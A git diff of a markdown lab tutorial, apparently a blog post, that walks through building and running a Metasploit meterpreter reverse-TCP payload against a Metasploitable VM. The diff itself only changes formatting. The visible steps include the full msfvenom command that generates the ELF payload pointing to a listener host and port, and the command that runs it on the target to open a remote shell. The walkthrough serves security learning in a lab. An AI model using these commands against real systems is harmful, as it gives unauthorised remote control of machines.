@@ -12,9 +12,10 @@ categories:
     - Parrot OS
 ---
 
-# Reverse shell
+Reverse shell
 
 Step 1: We will first need to create a payload for our Metasploitable VM.
+
 ```shell
 [msf](Jobs:0 Agents:0) >> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.16 LPORT=5555 -f elf -o reverse-sh.elf
 [*] exec: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.16 LPORT=5555 -f elf -o reverse-sh.elf
@@ -109,9 +110,11 @@ payload => linux/x86/meterpreter/reverse_tcp
 ```
 
 Step 5: Execute the payload on our target. Navigate back to terminal screen with the established SSH connection. Then, type the following:
+
 ```shell
 vagrant@metasploitable3-ub1404:~$ ./reverse-sh.elf
 ```
+
 Step 6: Return to the terminal screen which is running the Metasploit listener. You will see a meterpreter session has started and is now open. We have sucessfully established a stable shell! We can access the shell by typing “shell” into meterpreter. We can return to the Meterpreter interface from the shell by typing “exit” into the shell.
 
 ```shell
